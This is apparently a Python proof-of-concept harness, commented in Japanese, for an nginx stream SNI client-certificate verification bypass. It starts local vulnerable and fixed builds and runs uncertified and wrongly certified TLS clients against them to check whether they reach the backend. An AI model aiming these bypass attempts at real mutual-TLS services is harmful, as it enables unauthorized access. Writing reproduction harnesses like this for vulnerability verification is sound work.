#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-120967: stream の SNI 指定時クライアント証明書検証漏れ PoC モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
    trigger : bool  (無効証明書/無証明書 + SNI の接続が検証をバイパスして通過したか)
    effect  : TRIGGERED | VERIFIED | ERROR | SKIP

概要 / 再現原理:
  stream のバーチャルサーバ + SNI 構成 (default サーバ = ssl_verify_client off、
  SNI サーバ sni.example = ssl_verify_client on) を用意する。nginx 1.31.8 以前の
  ngx_stream_ssl_handler() は、ハンドラ先頭 (default サーバ) で取得した sscf を
  SSL ハンドシェイク完了後のクライアント証明書検証にも使い続ける。このため
  SNI コールバックの走った「最初の ngx_stream_ssl_handler() 呼び出し」の中で
  SSL_do_handshake() が 1 (完了) を返すと (同期完了)、SNI サーバ sni.example の
  ssl_verify_client on が適用されず、無効なクライアント証明書/無証明書の接続が
  通過してしまう (検証漏れ)。修正 (1.31.9, 6f9fcee / stable-1.30 は 77f90f1c) は
  ハンドシェイク完了後に sscf を取り直す 2 行。

  クライアントは Python ssl の MemoryBIO による擬似同期 (poll 交互) 実装で、
  SNI=sni.example を含む ClientHello を 1 セグメントで渡し切る。加えて
  send 分割 / TCP_MAXSEG / TLS1.2/1.3 / セッション再開 (openssl s_client) の
  バリエーションで「最初の呼び出しでのハンドシェイク完了 (同期完了)」を狙う。

判定:
  無効証明書/無証明書 + SNI の接続が上流バックエンドまで到達 (ACCEPT) したら
  検証バイパス発生 → effect=TRIGGERED, trigger=True。
  修正版では再取得した sscf (verify on) により接続が切断される (REJECT)。
  本環境の OpenSSL 3.0.22 ビルドでは同期完了が発生しない場合、両バージョンと
  も非同期経路 (2 回目以降の呼び出しで完了) で正しく検証されるため
  effect=VERIFIED, trigger=False を返す (error.log の SSL_do_handshake 呼び出し
  シーケンスを証拠として添付)。

専有ポート: stream ssl 18450 / 上流 echo 19012 (他タスクと衝突させない)。
"""
import os
import re
import signal
import socket
import ssl
import subprocess
import sys
import threading
import time

CVE = "CVE-2026-120967"
HOST_DEFAULT = "127.0.0.1"
P_LISTEN = 18450      # stream ssl (専有)
P_UPSTREAM = 19012    # 上流 echo (専有)
BANNER = b"POC-BACKEND-OK\n"

# ---------------------------------------------------------------- 上流 echo
class _Upstream:
    def __init__(self, host, port):
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        last = None
        for _ in range(50):
            try:
                self.srv.bind((host, port))
                last = None
                break
            except OSError as e:
                last = e
                time.sleep(0.1)
        if last is not None:
            raise last
        self.srv.listen(16)
        self.srv.settimeout(0.2)
        self._stop = False
        self.t = threading.Thread(target=self._loop, daemon=True)
        self.t.start()

    def _loop(self):
        while not self._stop:
            try:
                c, _ = self.srv.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(target=self._handle, args=(c,), daemon=True).start()

    @staticmethod
    def _handle(c):
        try:
            c.settimeout(5)
            c.recv(256)
            c.sendall(BANNER)
            time.sleep(0.1)
        except OSError:
            pass
        try:
            c.close()
        except OSError:
            pass

    def close(self):
        self._stop = True
        try:
            self.srv.settimeout(0.05)
        except OSError:
            pass
        if self.t.is_alive():
            self.t.join(1.0)
        try:
            self.srv.close()
        except OSError:
            pass


# ---------------------------------------------------------------- 証明書
def _gen_certs(certs):
    if os.path.exists(os.path.join(certs, "server-sni.pem")) and \
       os.path.exists(os.path.join(certs, "client-bad.pem")):
        return  # 既に生成済み
    cmds = [
        # CA1: サーバ証明書と正規クライアント証明書の発行元
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", "ca1.key", "-out", "ca1.pem", "-days", "3650",
         "-subj", "/CN=TestCA1"],
        # CA2: 別系統 (無効なクライアント証明書の発行元)
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", "ca2.key", "-out", "ca2.pem", "-days", "3650",
         "-subj", "/CN=TestCA2"],
        ["openssl", "req", "-newkey", "rsa:2048", "-nodes",
         "-keyout", "client-good.key", "-out", "client-good.csr",
         "-subj", "/CN=client-good"],
        ["openssl", "x509", "-req", "-in", "client-good.csr",
         "-CA", "ca1.pem", "-CAkey", "ca1.key", "-CAcreateserial",
         "-out", "client-good.pem", "-days", "3650"],
        ["openssl", "req", "-newkey", "rsa:2048", "-nodes",
         "-keyout", "client-bad.key", "-out", "client-bad.csr",
         "-subj", "/CN=client-bad"],
        ["openssl", "x509", "-req", "-in", "client-bad.csr",
         "-CA", "ca2.pem", "-CAkey", "ca2.key", "-CAcreateserial",
         "-out", "client-bad.pem", "-days", "3650"],
        ["openssl", "req", "-newkey", "rsa:2048", "-nodes",
         "-keyout", "server-default.key", "-out", "server-default.csr",
         "-subj", "/CN=default"],
        ["openssl", "x509", "-req", "-in", "server-default.csr",
         "-CA", "ca1.pem", "-CAkey", "ca1.key", "-CAcreateserial",
         "-out", "server-default.pem", "-days", "3650"],
        ["openssl", "req", "-newkey", "rsa:2048", "-nodes",
         "-keyout", "server-sni.key", "-out", "server-sni.csr",
         "-subj", "/CN=sni.example"],
        ["openssl", "x509", "-req", "-in", "server-sni.csr",
         "-CA", "ca1.pem", "-CAkey", "ca1.key", "-CAcreateserial",
         "-out", "server-sni.pem", "-days", "3650"],
    ]
    old = os.getcwd()
    try:
        os.chdir(certs)
        for c in cmds:
            subprocess.run(c, capture_output=True, timeout=60, check=False)
    finally:
        os.chdir(old)
    for f in os.listdir(certs):
        if f.endswith((".pem", ".key")):
            os.chmod(os.path.join(certs, f), 0o644)


# ---------------------------------------------------------------- nginx 設定
def _make_conf(rundir, certs):
    return """\
worker_processes 1;
daemon on;
pid %(rundir)s/nginx.pid;
error_log %(rundir)s/logs/error.log debug;

events {
    worker_connections 256;
}

stream {
    server {
        listen %(host)s:%(listen)d ssl;
        server_name default;
        ssl_certificate     %(certs)s/server-default.pem;
        ssl_certificate_key %(certs)s/server-default.key;
        ssl_session_cache   shared:SSLA:10m;
        ssl_session_tickets on;
        ssl_verify_client off;
        proxy_pass %(host)s:%(up)d;
    }

    server {
        listen %(host)s:%(listen)d ssl;
        server_name sni.example;
        ssl_certificate     %(certs)s/server-sni.pem;
        ssl_certificate_key %(certs)s/server-sni.key;
        ssl_session_cache   shared:SSLB:10m;
        ssl_session_tickets on;
        ssl_verify_client on;
        ssl_client_certificate %(certs)s/ca1.pem;
        proxy_pass %(host)s:%(up)d;
    }
}
""" % {"rundir": rundir, "host": "127.0.0.1", "listen": P_LISTEN,
       "up": P_UPSTREAM, "certs": certs}


def _stop_nginx(rundir, timeout=5.0):
    pidf = os.path.join(rundir, "nginx.pid")
    if not os.path.exists(pidf):
        return
    try:
        pid = int(open(pidf).read().strip())
    except Exception:  # noqa: BLE001
        return
    try:
        os.kill(pid, signal.SIGQUIT)
    except OSError:
        pass
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not os.path.exists("/proc/%d" % pid):
            break
        time.sleep(0.05)
    try:
        os.kill(pid, signal.SIGKILL)
    except OSError:
        pass
    try:
        os.unlink(pidf)
    except OSError:
        pass


# ---------------------------------------------------------------- クライアント
def _client_ctx(certs, cert=None, ver=ssl.TLSVersion.TLSv1_2):
    c = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    c.minimum_version = ver
    c.maximum_version = ver
    if cert:
        c.load_cert_chain(os.path.join(certs, cert + ".pem"),
                          os.path.join(certs, cert + ".key"))
    return c


def _async_connect(certs, cert=None, sni="sni.example",
                   ver=ssl.TLSVersion.TLSv1_2, timeout=5):
    """通常 (非同期経路) のクライアント。server_hostname で SNI を指定。"""
    c = _client_ctx(certs, cert, ver)
    try:
        raw = socket.create_connection(("127.0.0.1", P_LISTEN), timeout=timeout)
    except OSError:
        return "CONNFAIL"
    try:
        tls = c.wrap_socket(raw, server_hostname=sni)
    except (ssl.SSLError, OSError):
        return "REJECT-hs"
    try:
        tls.sendall(b"ping")
        d = tls.recv(256)
        return "ACCEPT" if d == BANNER else "REJECT-data"
    except (ssl.SSLError, OSError):
        return "REJECT-io"
    finally:
        try:
            tls.close()
        except Exception:  # noqa: BLE001
            pass


def _sync_connect(certs, cert=None, sni="sni.example",
                  ver=ssl.TLSVersion.TLSv1_2, split=None, mss=None,
                  appdata_early=False, timeout=5):
    """擬似同期 (MemoryBIO / poll 交互) クライアント。

    ClientHello を 1 セグメントで渡し切る (分割/TCP_MAXSEG はオプション)。
    sync 完了を狙い、サーバ flight を読む前に追いデータを投げる
    (appdata_early) パターンも用意。
    """
    c = _client_ctx(certs, cert, ver)
    inb, outb = ssl.MemoryBIO(), ssl.MemoryBIO()
    obj = c.wrap_bio(inb, outb, server_hostname=sni)
    try:
        raw = socket.create_connection(("127.0.0.1", P_LISTEN), timeout=timeout)
    except OSError:
        return "CONNFAIL"
    if mss:
        try:
            raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, mss)
        except OSError:
            pass
    raw.settimeout(timeout)
    try:
        while True:
            try:
                obj.do_handshake()
                break
            except ssl.SSLWantReadError:
                pass
            except (ssl.SSLError, OSError) as e:
                return "REJECT " + type(e).__name__
            flight = outb.read()
            if flight:
                if split and len(flight) > split:
                    raw.sendall(flight[:split])
                    time.sleep(0.02)
                    raw.sendall(flight[split:])
                else:
                    raw.sendall(flight)
                if appdata_early:
                    raw.sendall(b"ping")
            try:
                chunk = raw.recv(65536)
            except socket.timeout:
                return "TIMEOUT"
            except OSError:
                return "REJECT-io"
            if not chunk:
                return "CLOSED"
            inb.write(chunk)
        # ハンドシェイク完了後のアプリデータ交換
        try:
            raw.sendall(b"ping")
            d = raw.recv(256)
            return "ACCEPT" if d == BANNER else "REJECT-data"
        except (ssl.SSLError, OSError):
            return "REJECT-io"
    finally:
        try:
            raw.close()
        except Exception:  # noqa: BLE001
            pass


def _sclient_resume(certs, tlsver, sess_file, timeout=15):
    """openssl s_client によるセッション再開 (再開時も同期完了を狙う)。"""
    if not os.path.exists(sess_file):
        subprocess.run(
            ["openssl", "s_client", "-connect", "127.0.0.1:%d" % P_LISTEN,
             "-servername", "sni.example", "-quiet", "-tls1_%s" % tlsver,
             "-sess_out", sess_file],
            input="", capture_output=True, text=True, timeout=timeout, check=False)
    try:
        subprocess.run(
            ["openssl", "s_client", "-connect", "127.0.0.1:%d" % P_LISTEN,
             "-servername", "sni.example", "-quiet", "-tls1_%s" % tlsver,
             "-sess_in", sess_file],
            input="", capture_output=True, text=True, timeout=timeout, check=False)
        return "done"
    except subprocess.TimeoutExpired:
        return "timeout"


# ---------------------------------------------------------------- ログ解析
def _parse_log(errlog):
    """接続ごとの SSL_do_handshake シーケンスと検証エラーを集計。"""
    if not os.path.exists(errlog):
        return {"sequences": {}, "first_call_complete": [], "rejects": 0,
                "verify_msgs": []}
    log = open(errlog, errors="replace").read()
    seq = {}
    for ln in log.splitlines():
        m = re.search(r"\*(\d+) ", ln)
        if not m or "SSL_do_handshake:" not in ln:
            continue
        seq.setdefault(m.group(1), []).append(
            ln.split("SSL_do_handshake:")[1].strip())
    first_call = [c for c, v in seq.items() if v and v[0] == "1"]
    verify_msgs = []
    for ln in log.splitlines():
        if ("client sent no required SSL certificate" in ln
                or "client SSL certificate verify error" in ln):
            verify_msgs.append(ln[-160:])
    return {"sequences": seq, "first_call_complete": first_call,
            "rejects": len(verify_msgs), "verify_msgs": verify_msgs}


# ---------------------------------------------------------------- run
def _asan_env(binary):
    """ASan ビルドは LeakSanitizer の終了時検査で exit code が狂うため抑制。"""
    if "asan" in os.path.basename(binary) or "asan" in binary:
        env = dict(os.environ)
        env["ASAN_OPTIONS"] = (env.get("ASAN_OPTIONS", "") +
                               ":detect_leaks=0").lstrip(":")
        return env
    return None


def run(binary, workdir, host=HOST_DEFAULT):
    result = {
        "cve": CVE,
        "configured": False,
        "trigger": False,
        "effect": "ERROR",
        "detail": "",
    }
    base = os.path.abspath(workdir)
    if os.path.basename(base.rstrip("/")) == "poc-run-G":
        rundir = os.path.join(base, "120967")
    else:
        rundir = os.path.join(base, "poc-run-G", "120967")
    certs = os.path.join(rundir, "certs")
    logdir = os.path.join(rundir, "logs")
    errlog = os.path.join(logdir, "error.log")

    ups = None
    try:
        for d in (rundir, certs, logdir):
            os.makedirs(d, exist_ok=True)
        try:
            os.chmod(rundir, 0o777)  # ASan 版運用 (run/ を全員書込可に)
        except OSError:
            pass
        _stop_nginx(rundir)
        _gen_certs(certs)

        conf_path = os.path.join(rundir, "nginx.conf")
        with open(conf_path, "w") as f:
            f.write(_make_conf(rundir, certs))

        test = subprocess.run([binary, "-t", "-p", rundir + "/", "-c", conf_path],
                              capture_output=True, text=True, timeout=30,
                              env=_asan_env(binary))
        if test.returncode != 0 and "test is successful" not in \
                (test.stderr or "") + (test.stdout or ""):
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result

        try:
            ver = subprocess.run([binary, "-v"], capture_output=True, text=True,
                                 timeout=15)
            version = (ver.stderr or ver.stdout).strip()
        except Exception:  # noqa: BLE001
            version = "unknown"

        # ログを初期化して起動
        try:
            os.unlink(errlog)
        except OSError:
            pass
        started = subprocess.run([binary, "-p", rundir + "/", "-c", conf_path],
                                 capture_output=True, text=True, timeout=30,
                                 env=_asan_env(binary))
        if started.returncode != 0:
            result["effect"] = "ERROR"
            result["detail"] = "nginx 起動失敗: " + (started.stderr or started.stdout).strip()
            return result
        ok = False
        for _ in range(50):
            try:
                socket.create_connection(("127.0.0.1", P_LISTEN), timeout=0.3).close()
                ok = True
                break
            except OSError:
                time.sleep(0.1)
        if not ok:
            result["effect"] = "ERROR"
            result["detail"] = "stream ポート (%d) が listen しない" % P_LISTEN
            return result

        result["configured"] = True
        ups = _Upstream("127.0.0.1", P_UPSTREAM)

        # ---- クライアントバッテリ (すべて SNI=sni.example = verify on サーバ) ----
        attempts = {}
        attempts["async_no-cert_tls12"] = _async_connect(certs)
        attempts["async_no-cert_tls13"] = _async_connect(
            certs, ver=ssl.TLSVersion.TLSv1_3)
        attempts["async_bad-cert_tls12"] = _async_connect(certs, "client-bad")
        attempts["async_bad-cert_tls13"] = _async_connect(
            certs, "client-bad", ver=ssl.TLSVersion.TLSv1_3)
        # 擬似同期: ClientHello を 1 セグメントで渡し切る
        attempts["sync_no-cert_tls12_1seg"] = _sync_connect(certs)
        attempts["sync_no-cert_tls13_1seg"] = _sync_connect(
            certs, ver=ssl.TLSVersion.TLSv1_3)
        attempts["sync_bad-cert_tls12_1seg"] = _sync_connect(certs, "client-bad")
        # send 分割 / TCP_MAXSEG / 先行 app データ
        attempts["sync_no-cert_tls12_split"] = _sync_connect(certs, split=64)
        attempts["sync_no-cert_tls12_mss"] = _sync_connect(certs, mss=1400)
        attempts["sync_no-cert_tls12_appdata"] = _sync_connect(
            certs, appdata_early=True)
        # セッション再開 (openssl s_client)
        sess2 = os.path.join(rundir, "sess_tls12.pem")
        sess3 = os.path.join(rundir, "sess_tls13.pem")
        for f in (sess2, sess3):
            try:
                os.unlink(f)
            except OSError:
                pass
        attempts["resume_tls12"] = _sclient_resume(certs, "2", sess2)
        attempts["resume_tls13"] = _sclient_resume(certs, "3", sess3)
        # 正規証明書 (検証が通ることの対照実験)
        attempts["ctrl_good-cert_tls12"] = _async_connect(certs, "client-good")
        attempts["ctrl_good-cert_tls13"] = _async_connect(
            certs, "client-good", ver=ssl.TLSVersion.TLSv1_3)

        time.sleep(0.3)
        logstat = _parse_log(errlog)

        # ---- 判定 ----
        bypass = [k for k, v in attempts.items()
                  if v == "ACCEPT" and "no-cert" in k or
                  (v == "ACCEPT" and "bad-cert" in k)]
        good_ctrl = [v for k, v in attempts.items() if k.startswith("ctrl")]
        conn_total = len(logstat["sequences"])
        first_call = logstat["first_call_complete"]

        if bypass:
            # 検証バイパス発生 (脆弱性の顕在化)
            result["trigger"] = True
            result["effect"] = "TRIGGERED"
            result["detail"] = ("無効証明書/無証明書 + SNI=sni.example の接続が"
                                " 検証をバイパスして上流へ到達: " + ",".join(bypass) +
                                " (接続数=%d, first-call 完了=%s)" %
                                (conn_total, first_call))
        else:
            rejected = [k for k, v in attempts.items()
                        if str(v).startswith("REJECT") and
                        ("no-cert" in k or "bad-cert" in k)]
            result["trigger"] = False
            result["effect"] = "VERIFIED"
            result["detail"] = (
                "同期完了 (最初の ngx_stream_ssl_handler 呼び出し内での"
                " SSL_do_handshake 完了) が発生しなかったため検証バイパス未発生。"
                "無効証明書/無証明書 + SNI の全試行 (%d 件) は検証エラーで切断され、"
                "正規証明書は通過 (ctrl=%s)。接続 %d 件すべて 2 回以上の"
                " SSL_do_handshake 呼び出しで完了 (first-call 完了 0 件) のため"
                " 非同期経路の検証 (SNI 選択後の sscf) が有効。" %
                (len(rejected), good_ctrl, conn_total))
        result["version"] = version
        result["attempts"] = attempts
        result["logstat"] = {"connections": conn_total,
                             "first_call_complete": len(first_call),
                             "verify_rejects": logstat["rejects"]}
        return result
    except Exception as exc:  # noqa: BLE001
        import traceback
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        result["traceback"] = traceback.format_exc()
        return result
    finally:
        if ups:
            ups.close()
        _stop_nginx(rundir)


def _probe_emulation(rundir, certs, conf_path):
    """プローブビルド (1.31.8 + 計装, build/v1.31.8-probe) による同期完了
    エミュレーション検証。プローブバイナリが無ければ available=False。

    NGX_PROBE_EMUL_SYNC=1       : 「最初の ngx_stream_ssl_handler() 呼び出し内で
                                  ハンドシェイクが完了した」場合の構成再利用
                                  (初回呼び出し時 = default サーバの sscf) を模倣
    NGX_PROBE_EMUL_SYNC=1 +FIX  : 修正版 (1.31.9) 相当の動作
    """
    probe = os.path.join(rundir, "probe", "sbin", "nginx")
    if not os.path.exists(probe):
        return {"available": False}
    out = {"available": True, "binary": probe, "modes": {}}
    modes = (
        ("natural_async", {}),
        ("emul_sync_vulnerable", {"NGX_PROBE_EMUL_SYNC": "1"}),
        ("emul_sync_fixed", {"NGX_PROBE_EMUL_SYNC": "1",
                             "NGX_PROBE_SYNC_FIX": "1"}),
    )
    ups = None
    try:
        ups = _Upstream("127.0.0.1", P_UPSTREAM)
        for label, extra in modes:
            _stop_nginx(rundir)
            env = dict(os.environ)
            env.update(extra)
            try:
                os.unlink(os.path.join(rundir, "logs", "error.log"))
            except OSError:
                pass
            r = subprocess.run([probe, "-p", rundir + "/", "-c", conf_path],
                               capture_output=True, text=True, timeout=30,
                               env=env)
            ok = False
            if r.returncode == 0:
                for _ in range(30):
                    try:
                        socket.create_connection(("127.0.0.1", P_LISTEN),
                                                 timeout=0.3).close()
                        ok = True
                        break
                    except OSError:
                        time.sleep(0.1)
            if not ok:
                out["modes"][label] = {"error": "probe nginx 起動失敗"}
                continue
            out["modes"][label] = {
                "no_cert": _async_connect(certs),
                "bad_cert": _async_connect(certs, "client-bad"),
                "good_cert": _async_connect(certs, "client-good"),
            }
            time.sleep(0.2)
        return out
    finally:
        if ups:
            ups.close()
        _stop_nginx(rundir)


# ---------------------------------------------------------------- CLI
def _main():
    binaries = {
        "vuln": "/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx",
        "fixed": "/app/data/sessions/conv-43/build/inst-fixed/sbin/nginx",
        "asan-vuln": "/app/data/sessions/conv-43/build/inst-asan-vuln/sbin/nginx",
        "asan-fixed": "/app/data/sessions/conv-43/build/inst-asan-fixed/sbin/nginx",
        "vuln1306": "/app/data/sessions/conv-43/build/inst-vuln1306/sbin/nginx",
        "fixed1307": "/app/data/sessions/conv-43/build/inst-fixed1307/sbin/nginx",
    }
    out = {}
    if len(sys.argv) > 1 and sys.argv[1] not in binaries:
        # 単一バイナリ指定 (パス)
        out = {"single": run(sys.argv[1],
                             sys.argv[2] if len(sys.argv) > 2
                             else "/app/data/sessions/conv-43")}
        print(out["single"]["effect"], "-", out["single"]["detail"][:300])
    else:
        sel = [sys.argv[1]] if len(sys.argv) > 1 and sys.argv[1] in binaries \
            else list(binaries)
        for name in sel:
            b = binaries[name]
            if not os.path.exists(b):
                out[name] = {"error": "binary not found: " + b}
                continue
            out[name] = run(b, "/app/data/sessions/conv-43")
            print(name, "->", out[name]["effect"],
                  "| trigger =", out[name]["trigger"])
        # プローブビルドによる同期完了エミュレーション (検出されれば記録)
        rundir = "/app/data/sessions/conv-43/poc-run-G/120967"
        probe = _probe_emulation(rundir, os.path.join(rundir, "certs"),
                                 os.path.join(rundir, "nginx.conf"))
        if probe.get("available"):
            out["probe_emulation"] = probe
            print("probe_emulation ->", probe["modes"])
        with open("/app/data/sessions/conv-43/modules/120967.result.json",
                  "w") as f:
            import json
            json.dump(out, f, ensure_ascii=False, indent=1)


if __name__ == "__main__":
    _main()
